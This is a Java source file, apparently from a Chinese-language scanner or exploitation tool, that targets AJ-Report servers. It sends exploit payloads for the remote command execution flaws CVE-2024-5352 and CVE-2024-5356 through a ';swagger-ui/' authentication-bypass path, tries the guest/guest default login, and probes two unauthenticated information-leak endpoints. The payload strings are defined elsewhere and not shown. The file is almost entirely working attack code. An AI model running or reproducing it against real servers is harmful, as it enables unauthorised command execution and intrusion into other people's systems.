package com.liev.clouds.exp;

import com.liev.clouds.payload.AjReportPayload;
import com.liev.clouds.utils.DataUtils;
import com.liev.clouds.dao.HttpResponse;
import com.liev.clouds.utils.HttpUtils;
import com.liev.clouds.webcontroller.framework.AJreportController;

import java.util.*;

public class AjReportExp {


    /**
     * CVE-2024-5352(任意命令执行)
     * @param url 基础 URL
     * @param headers 请求头
     * @param controller 控制器
     */
    public static void RCE_dataSetParam_verification(String url, Map<String, String> headers, AJreportController controller){
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        String urlTrue = url + "/dataSetParam/verification;swagger-ui/";
        String[] payloads = {AjReportPayload.RCE_EXP, AjReportPayload.GORRVY_EXP, AjReportPayload.JNDI_EXP};

        boolean vulnerabilityExists = false;

        for (String payload : payloads) {
            try {
                HttpResponse response = HttpUtils.sendPost(urlTrue, payload, headers);
                String responseBody = response.getResponseBody();

                if ((response.getResponseCode() == 200 && !DataUtils.checkVulnerability(responseBody, "\"data\":\"(.*?)\"", "")) || DataUtils.checkVulnerability(responseBody, "\"code\":\"(.*?)\"", "4005")) {
                    controller.log.appendText("[+++]CVE-2024-5352任意命令执行漏洞存在!【√】\n");
                    controller.responseBody.appendText(DataUtils.formatJson(responseBody) + "\n\n\n");
                    vulnerabilityExists = true;
                    break;
                }
            } catch (Exception e) {
                System.err.println("Error during HTTP request: " + e.getMessage());
            }
        }

        // 如果没有检测到漏洞
        if (!vulnerabilityExists) {
            controller.log.appendText("[---]CVE-2024-5352任意命令执行漏洞存不存在！\n");
        }


    }

    /**
     * CVE-2024-5356(任意命令执行)
     * @param url 基础 URL
     * @param headers 请求头
     * @param controller 控制器
     */
    public static void RCE_dataSet_testTransform(String url, Map<String, String> headers, AJreportController controller){
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        String urlTrue = url + "/dataSet/testTransform;swagger-ui/";
        boolean vulnerabilityExists = false;

        try {
            HttpResponse response = HttpUtils.sendPost(urlTrue, AjReportPayload.JS_EXP, headers);
            String responseBody = response.getResponseBody();

            if (response.getResponseCode() == 200 && DataUtils.checkVulnerability(responseBody, "\"code\":\"(.*?)\"", "4005")) {
                controller.log.appendText("[+++]CVE-2024-5356任意命令执行漏洞存在!【√】\n");
                controller.responseBody.appendText(DataUtils.formatJson(responseBody) + "\n\n\n");
                vulnerabilityExists = true;
            }
        } catch (Exception e) {
            System.err.println("Error during HTTP request: " + e.getMessage());
        }

        if (!vulnerabilityExists) {
            controller.log.appendText("[---]CVE-2024-5356任意命令执行漏洞不存在！\n");
        }

    }

    /**
     * 弱口令
     * @param url 基础 URL
     * @param headers 请求头
     * @param controller 控制器
     */
    public static void weak_password(String url, Map<String, String> headers, AJreportController controller){
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        String urlTrue = url + "/accessUser/login";
        boolean vulnerabilityExists = false;

        try{
            HttpResponse response = HttpUtils.sendPost(urlTrue, AjReportPayload.WEAK_PASSWORD, headers);
            String responseBody = response.getResponseBody();

            if (response.getResponseCode() == 200 && DataUtils.checkVulnerability(responseBody, "\"code\":\"(.*?)\"", "200")){
                controller.log.appendText("[+++]AjReport存在弱口令 guest-guest !【√】\n");
                controller.responseBody.appendText(DataUtils.formatJson(responseBody) + "\n\n\n");
                vulnerabilityExists = true;
            }
        }catch (Exception e){
            System.err.println("Error during HTTP request: " + e.getMessage());
        }

        if (!vulnerabilityExists) {
            controller.log.appendText("[---]AjReport存在弱口令不存在！\n");
        }
    }

    /**
     * 信息泄露
     * @param url 基础 URL
     * @param headers 请求头
     * @param controller 控制器
     */
    public static void information_leakage(String url, Map<String, String> headers, AJreportController controller){
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        String[] urlTrue = {url + "/;swagger-ui/gaeaDict/all", url + "/;swagger-ui/gaeaDict/select/SOURCE_TYPE"};
        boolean vulnerabilityExists = false;

        for (String urls : urlTrue){
            try {
                HttpResponse response = HttpUtils.sendGet(urls, headers);
                String responseBody = response.getResponseBody();

                if (response.getResponseCode() == 200 && DataUtils.checkVulnerability(responseBody, "\"code\":\"(.*?)\"", "200")) {
                    controller.log.appendText("[+++]AjReport存在SQL信息泄露!【√】\n");
                    controller.responseBody.appendText(DataUtils.formatJson(responseBody) + "\n\n\n");
                    vulnerabilityExists = true;
                }
            } catch (Exception e) {
                System.err.println("Error during HTTP request: " + e.getMessage());
            }
        }
        if (!vulnerabilityExists) {
            controller.log.appendText("[---]AjReport信息泄露不存在！\n");
        }
    }
}
